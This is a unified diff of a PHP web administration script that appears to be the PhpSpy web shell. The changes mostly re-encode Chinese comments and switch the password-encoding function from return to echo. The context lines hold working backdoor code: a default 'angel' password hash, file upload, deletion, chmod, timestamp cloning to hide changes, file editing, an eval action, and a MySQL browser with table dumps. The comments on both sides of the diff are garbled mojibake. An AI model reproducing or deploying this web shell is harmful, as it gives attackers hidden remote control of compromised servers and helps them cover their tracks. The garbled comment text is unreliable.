@@ -23,24 +23,24 @@ if( IS_GPC ) {
 }
 $P = $_POST;
 unset($_POST);
-/*===================== ³ÌĞòÅäÖÃ =====================*/
+/*===================== ç¨‹åºé…ç½® =====================*/
 
 //echo encode_pass('angel');exit;
 //angel = ec38fe2a8497e0a8d6d349b3533038cb
-// Èç¹ûĞèÒªÃÜÂëÑéÖ¤,ÇëĞŞ¸ÄµÇÂ½ÃÜÂë,Áô¿ÕÎª²»ĞèÒªÑéÖ¤
+// å¦‚æœéœ€è¦å¯†ç éªŒè¯,è¯·ä¿®æ”¹ç™»é™†å¯†ç ,ç•™ç©ºä¸ºä¸éœ€è¦éªŒè¯
 $pass  = 'ec38fe2a8497e0a8d6d349b3533038cb'; //angel
 
-//ÈçÄú¶Ô cookie ×÷ÓÃ·¶Î§ÓĞÌØÊâÒªÇó, »òµÇÂ¼²»Õı³£, ÇëĞŞ¸ÄÏÂÃæ±äÁ¿, ·ñÔòÇë±£³ÖÄ¬ÈÏ
-// cookie Ç°×º
+//å¦‚æ‚¨å¯¹ cookie ä½œç”¨èŒƒå›´æœ‰ç‰¹æ®Šè¦æ±‚, æˆ–ç™»å½•ä¸æ­£å¸¸, è¯·ä¿®æ”¹ä¸‹é¢å˜é‡, å¦åˆ™è¯·ä¿æŒé»˜è®¤
+// cookie å‰ç¼€
 $cookiepre = '';
-// cookie ×÷ÓÃÓò
+// cookie ä½œç”¨åŸŸ
 $cookiedomain = '';
-// cookie ×÷ÓÃÂ·¾¶
+// cookie ä½œç”¨è·¯å¾„
 $cookiepath = '/';
-// cookie ÓĞĞ§ÆÚ
+// cookie æœ‰æ•ˆæœŸ
 $cookielife = 86400;
 
-/*===================== ÅäÖÃ½áÊø =====================*/
+/*===================== é…ç½®ç»“æŸ =====================*/
 
 $charsetdb = array(
 	'big5'			=> 'big5',
@@ -69,7 +69,7 @@ if (isset($charsetdb[$charset])) {
 
 $timestamp = time();
 
-/* Éí·İÑéÖ¤ */
+/* èº«ä»½éªŒè¯ */
 if ($act == "logout") {
 	scookie('loginpass', '', -86400 * 365);
 	@header('Location: '.SELF);
@@ -91,14 +91,14 @@ if($pass) {
 		loginpage();
 	}
 }
-/* ÑéÖ¤½áÊø */
+/* éªŒè¯ç»“æŸ */
 
 $errmsg = '';
 $uchar = '&#9650;';
 $dchar = '&#9660;';
 !$act && $act = 'file';
 
-//µ±Ç°Ä¿Â¼/ÉèÖÃ¹¤×÷Ä¿Â¼/ÍøÕ¾¸ùÄ¿Â¼
+//å½“å‰ç›®å½•/è®¾ç½®å·¥ä½œç›®å½•/ç½‘ç«™æ ¹ç›®å½•
 $home_cwd = getcwd();
 if (isset($P['cwd']) && $P['cwd']) {
 	chdir($P['cwd']);
@@ -116,7 +116,7 @@ foreach (array('web_cwd','cwd','home_cwd') as $k) {
 	}
 }
 
-// ²é¿´PHPINFO
+// æŸ¥çœ‹PHPINFO
 if ($act == 'phpinfo') {
 	if (IS_PHPINFO) {
 		phpinfo();
@@ -318,49 +318,49 @@ $errmsg && m($errmsg);
 
 if ($act == 'file') {
 
-	// ÅĞ¶Ïµ±Ç°Ä¿Â¼¿ÉĞ´Çé¿ö
+	// åˆ¤æ–­å½“å‰ç›®å½•å¯å†™æƒ…å†µ
 	$dir_writeable = @is_writable($cwd) ? 'Writable' : 'Non-writable';
 	if (isset($p1)) {
 		switch($p1) {
 			case 'createdir':
-				// ´´½¨Ä¿Â¼
+				// åˆ›å»ºç›®å½•
 				if ($p2) {
 					m('Directory created '.(@mkdir($cwd.$p2,0777) ? 'success' : 'failed'));
 				}
 				break;
 			case 'uploadFile':
-				// ÉÏ´«ÎÄ¼ş
+				// ä¸Šä¼ æ–‡ä»¶
 				m('File upload '.(@move_uploaded_file($_FILES['uploadfile']['tmp_name'], $cwd.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));
 				break;
 			case 'fileperm':
-				// ±à¼­ÎÄ¼şÊôĞÔ
+				// ç¼–è¾‘æ–‡ä»¶å±æ€§
 				if ($p2 && $p3) {
 					$p3 = base_convert($p3, 8, 10);
 					m('Set file permissions '.(@chmod($p2, $p3) ? 'success' : 'failed'));
 				}
 				break;
 			case 'rename':
-				// ¸ÄÃû
+				// æ”¹å
 				if ($p2 && $p3) {
 					m($p3.' renamed '.$p2.(@rename($p3, $p2) ? ' success' : ' failed'));
 				}
 				break;
 			case 'clonetime':
-				// ¿ËÂ¡Ê±¼ä
+				// å…‹éš†æ—¶é—´
 				if ($p2 && $p3) {
 					$time = @filemtime($p3);
 					m('Set file last modified '.(@touch($p2,$time,$time) ? 'success' : 'failed'));
 				}
 				break;
 			case 'settime':
-				// ×Ô¶¨ÒåÊ±¼ä
+				// è‡ªå®šä¹‰æ—¶é—´
 				if ($p2 && $p3) {
 					$time = strtotime($p3);
 					m('Set file last modified '.(@touch($p2,$time,$time) ? 'success' : 'failed'));
 				}
 				break;
 			case 'delete':
-				// ÅúÁ¿É¾³ıÎÄ¼ş
+				// æ‰¹é‡åˆ é™¤æ–‡ä»¶
 				if ($P['dl']) {
 					$succ = $fail = 0;
 					foreach ($P['dl'] as $f) {
@@ -410,7 +410,7 @@ if ($act == 'file') {
 		}
 		echo "<script type=\"text/javascript\">$('opform').p1.value='';$('opform').p2.value='';</script>";
 	}
-	//²Ù×÷Íê±Ï
+	//æ“ä½œå®Œæ¯•
 	$free = @disk_free_space($cwd);
 	!$free && $free = 0;
 	$all = @disk_total_space($cwd);
@@ -511,14 +511,14 @@ function shownav(e){
 	p('<td width="22%">Action</td>');
 	p('</tr>');
 
-	//²é¿´ËùÓĞ¿ÉĞ´ÎÄ¼şºÍÄ¿Â¼
+	//æŸ¥çœ‹æ‰€æœ‰å¯å†™æ–‡ä»¶å’Œç›®å½•
 	$dirdata=$filedata=array();
 
 	if ($p4 == 'dir') {
 		$dirdata = GetWDirList($cwd);
 		$filedata = array();
 	} else {
-		// Ä¬ÈÏÄ¿Â¼ÁĞ±í
+		// é»˜è®¤ç›®å½•åˆ—è¡¨
 		$dirs = @scandir($cwd);
 		if ($dirs) {
 			$dirs = array_diff($dirs, array('.'));
@@ -673,17 +673,17 @@ elseif ($act == 'mysqladmin') {
 
 	if ($dbhost && $dbuser && isset($dbpass)) {
 		
-		// ³õÊ¼»¯Êı¾İ¿âÀà
+		// åˆå§‹åŒ–æ•°æ®åº“ç±»
 		$DB = new DB_MySQL;
 		$DB->charsetdb = $charsetdb;
 		$DB->charset = $charset;
 		$DB->connect($dbhost, $dbuser, $dbpass, $dbname);
 
-		//»ñÈ¡Êı¾İ¿âĞÅÏ¢
+		//è·å–æ•°æ®åº“ä¿¡æ¯
 		p('<p class="red">MySQL '.$DB->version().' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');
 		$highver = $DB->version() > '4.1' ? 1 : 0;
 
-		//»ñÈ¡Êı¾İ¿â
+		//è·å–æ•°æ®åº“
 		$query = $DB->query("SHOW DATABASES");
 		$dbs = array();
 		$dbs[] = '-- Select a database --';
@@ -736,7 +736,7 @@ elseif ($act == 'mysqladmin') {
 									while($mn = $DB->fetch($result)){
 										$thisbg = bg();
 										p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
-										//¶ÁÈ¡¼ÇÂ¼ÓÃ
+										//è¯»å–è®°å½•ç”¨
 										foreach($mn as $key=>$inside){
 											p('<td nowrap>'.(($inside == null) ? '<i>null</i>' : html_clean($inside)).'</td>');
 										}
@@ -925,7 +925,7 @@ elseif ($act == 'eval') {
 
 elseif ($act == 'editfile') {
 
-	// ±à¼­ÎÄ¼ş
+	// ç¼–è¾‘æ–‡ä»¶
 	if ($p1 == 'edit' && $p2 && $p3) {
 		$fp = @fopen($p2,'w');
 		m('Save file '.(@fwrite($fp,$p3) ? 'success' : 'failed'));
@@ -1094,7 +1094,7 @@ else {
 <?php
 
 /*======================================================
-º¯Êı¿â
+å‡½æ•°åº“
 ======================================================*/
 
 function secparam($n, $v) {
@@ -1182,7 +1182,7 @@ function dirsize($cwd) {
 	@closedir($dh);
 	return $size;
 }
-// Ò³Ãæµ÷ÊÔĞÅÏ¢
+// é¡µé¢è°ƒè¯•ä¿¡æ¯
 function debuginfo() {
 	global $starttime;
 	$mtime = explode(' ', microtime());
@@ -1190,7 +1190,7 @@ function debuginfo() {
 	echo 'Processed in '.$totaltime.' second(s)';
 }
 
-// Çå³ıHTML´úÂë
+// æ¸…é™¤HTMLä»£ç 
 function html_clean($content) {
 	$content = htmlspecialchars($content);
 	$content = str_replace("\n", "<br />", $content);
@@ -1199,7 +1199,7 @@ function html_clean($content) {
 	return $content;
 }
 
-// »ñÈ¡È¨ÏŞ
+// è·å–æƒé™
 function getChmod($file){
 	return substr(base_convert(@fileperms($file),10,8),-4);
 }
@@ -1265,7 +1265,7 @@ function copy_paste($c,$f,$d){
 		copy($c.$f, $d.$f);
 	}
 }
-// É¾³ıÄ¿Â¼
+// åˆ é™¤ç›®å½•
 function deltree($deldir) {
 	$dirs = @scandir($deldir);
 	if ($dirs) {
@@ -1286,7 +1286,7 @@ function deltree($deldir) {
 	}
 }
 
-// ±í¸ñĞĞ¼äµÄ±³¾°É«Ìæ»»
+// è¡¨æ ¼è¡Œé—´çš„èƒŒæ™¯è‰²æ›¿æ¢
 function bg() {
 	global $bgc;
 	return ($bgc++%2==0) ? 'alt1' : 'alt2';
@@ -1301,7 +1301,7 @@ function cmp($a, $b) {
 	}
 }
 
-// »ñÈ¡µ±Ç°Ä¿Â¼µÄÉÏ¼¶Ä¿Â¼
+// è·å–å½“å‰ç›®å½•çš„ä¸Šçº§ç›®å½•
 function getUpPath($cwd) {
 	$pathdb = explode('/', $cwd);
 	$num = count($pathdb);
@@ -1313,7 +1313,7 @@ function getUpPath($cwd) {
 	return $uppath;
 }
 
-// ¼ì²éPHPÅäÖÃ²ÎÊı
+// æ£€æŸ¥PHPé…ç½®å‚æ•°
 function getcfg($varname) {
 	$result = get_cfg_var($varname);
 	if ($result == 0) {
@@ -1325,7 +1325,7 @@ function getcfg($varname) {
 	}
 }
 
-// »ñµÃÎÄ¼şÀ©Õ¹Ãû
+// è·å¾—æ–‡ä»¶æ‰©å±•å
 function getext($file) {
 	$info = pathinfo($file);
 	return $info['extension'];
@@ -1436,7 +1436,7 @@ function encode_pass($pass) {
 	$pass = md5($k.$pass);
 	$pass = md5($pass.$k);
 	$pass = md5($k.$pass.$k);
-	return $pass;
+	echo $pass;
 }
 
 function pr($a) {
@@ -1546,7 +1546,7 @@ class DB_MySQL  {
 		$s = str_replace('\'', '\'\'', $s);
 		return $s;
 	}
-	// ±¸·İÊı¾İ¿â
+	// å¤‡ä»½æ•°æ®åº“
 	function sqldump($table, $fp=0) {
 		$crlf = (IS_WIN ? "\r\n" : "\n");
 		$search = array("\x00", "\x0a", "\x0d", "\x1a"); //\x08\\x09, not required
